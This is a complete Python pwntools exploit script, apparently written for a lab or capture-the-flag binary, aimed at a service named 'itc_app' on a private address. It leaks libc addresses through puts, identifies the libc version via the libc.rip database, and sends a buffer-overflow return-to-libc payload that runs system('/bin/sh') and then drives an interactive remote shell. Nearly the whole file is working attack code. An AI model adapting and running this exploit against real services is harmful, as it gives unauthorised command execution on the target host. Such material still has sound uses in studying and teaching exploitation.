import json
import requests
from pwn import remote, u32, p32, flat, log

# Connection Information
conn = '192.168.0.155'
port = 9000

# Output Lines Configuration
OUTPUT_LINES_BEFORE = 6
OUTPUT_LINES_AFTER = 2

# Static Configuration
static = "./itc_app"
buffSize = 132

# URLs and Headers for API Requests
findLibcUrl = 'https://libc.rip/api/find'
libcSearchUrl = "https://libc.rip/api/libc/"
HEADERS = {'Content-Type': 'application/json'}

# Function Offsets
pltPuts = 0x8048340
pltGets = 0x08048330
mainAddr = 0x804847b
gotPuts = 0x80497ac
gotGets = 0x80497a8

def handle_reverse_shell(redirect_stderr=True):
    """
    Handles the reverse shell interaction with the process.
    """
    try:
        proc.sendline(b"whoami 2>&1" if redirect_stderr else b"whoami")
        print(proc.recv(timeout=0.1).decode('utf-8'))
        while True:
            command = input("$ ")
            proc.sendline(command.encode('utf-8') + (b" 2>&1" if redirect_stderr else b""))
            print(proc.recv(timeout=0.2).decode('utf-8'))
    except EOFError:
        return 300
    return 200

def leak_via_puts(conn, port,put_out_addr, msg="puts"):
    """
    Leaks randomised libc address via puts' PLT and function's GOT.
    """
    global proc

    proc = remote(conn,port)
    payload = flat(
        b'A' * buffSize,
        p32(pltPuts),
        p32(mainAddr),
        p32(put_out_addr),
    )
    
    proc.sendline(payload)
    skip_lines(proc, OUTPUT_LINES_BEFORE)
    puts_addr = u32(proc.recv(4))
    skip_lines(proc, OUTPUT_LINES_AFTER)
    log.success(f"Leaked address of {msg}: {hex(puts_addr)}")
    return puts_addr

# Perform a return-to-libc attack executing system('/bin/sh')
def attemptR2Libc(putsOffset, systemOffset, exitOffset, binShOffset):
    # Leak randomised libc puts addr
    puts_addr = leak_via_puts(conn, port, gotPuts)

    # Get lib base addr using putsOffset
    libc_address = puts_addr - putsOffset
    log.success(f'LIBC base: {hex(libc_address)}')

    systemBytes = p32(systemOffset+libc_address)
    exitBytes = p32(exitOffset+libc_address)
    binShBytes = p32(binShOffset+libc_address)
    
    # Create and send system('/bin/sh') buffer overflow payload
    payload = flat(
        b'B' * buffSize, # Padding so the next bytes will overwrite the EIP
        systemBytes,     # Overflowed function will execute system() on return
        exitBytes,       # system will execute libc's exit() on return
        binShBytes,      # system's first pararmter 
                         # Which is libc's '/bin/sh' offset making the function call system('/bin/sh')
    )
    proc.sendline(payload)
    log.success("Executed system('/bin/sh') overflow")

    # Ouput next lines so next recv will be the ouput of system('/bin/sh')
    for _ in range(OUTPUT_LINES_AFTER):
        print(proc.recv(timeout = 0.05))
    
    # Check if reverse shell was spawned then handle user input and output for the process
    return handle_reverse_shell()

def skip_lines(proc, lines):
    """
    Skips a specified number of lines in the process output.
    """
    for _ in range(lines):
        try:
            proc.recvline()
        except EOFError:
            pass

def find_potential_libcs(puts_addr,gets_addr):
    """
    Retrieves potential libc versions matching given offsets.
    """
    data = {"symbols": {"puts": hex(puts_addr),"gets": hex(gets_addr)}}
    response = requests.post(findLibcUrl, headers=HEADERS, data=json.dumps(data))
    return response.json()

# Find the offsets of functions and '/bin/sh' from the current libc json
def getLibcSymbolOffsets(libcJson):
    # Get the libc id to perform a more thorough search of functions
    libId = libcJson['id']
    libcUrl = libcSearchUrl+libId
    
    # Define extra symbols to retrieve from the database
    findSymbols = {"symbols": ["exit", "mprotect", "malloc", "memcpy"]}

    # Request symbols from the datatbase
    response = requests.post(libcUrl, headers=HEADERS, data=json.dumps(findSymbols))
    symbolJson = response.json()

    # Store the symbols into variables
    putsOff = symbolJson['symbols'].get('puts')
    systemOff = symbolJson['symbols'].get('system')
    exitOff = symbolJson['symbols'].get('exit')
    bin_shOff = symbolJson['symbols'].get('str_bin_sh')
    print()
    log.info("Trying offsets for libc version: "+libId)
    log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}")
    return putsOff, systemOff, exitOff, bin_shOff

def main():
    puts_addr = leak_via_puts(conn,port,gotPuts)
    gets_addr = leak_via_puts(conn,port,gotGets,msg="gets")
    responseJson = find_potential_libcs(puts_addr,gets_addr)

    # Attempt to execute system('/bin/sh') using ret-to-libc on each potential libc version
    for item in responseJson:
        # Get the symbol offsets for the specific libc version
        putsOff, systemOff, exitOff, bin_shOff = getLibcSymbolOffsets(item)

        # Attempt to execute system('/bin/sh')
        retVal = attemptR2Libc(int(putsOff,16),int(systemOff,16),int(exitOff,16),int(bin_shOff,16))

        # Print exit message depending on the return value
        if retVal == 200:
            print("End of file recieved")
            break
        else:
            log.failure("Recieved premature EOF")
            proc.close()

if __name__ == "__main__":
    main()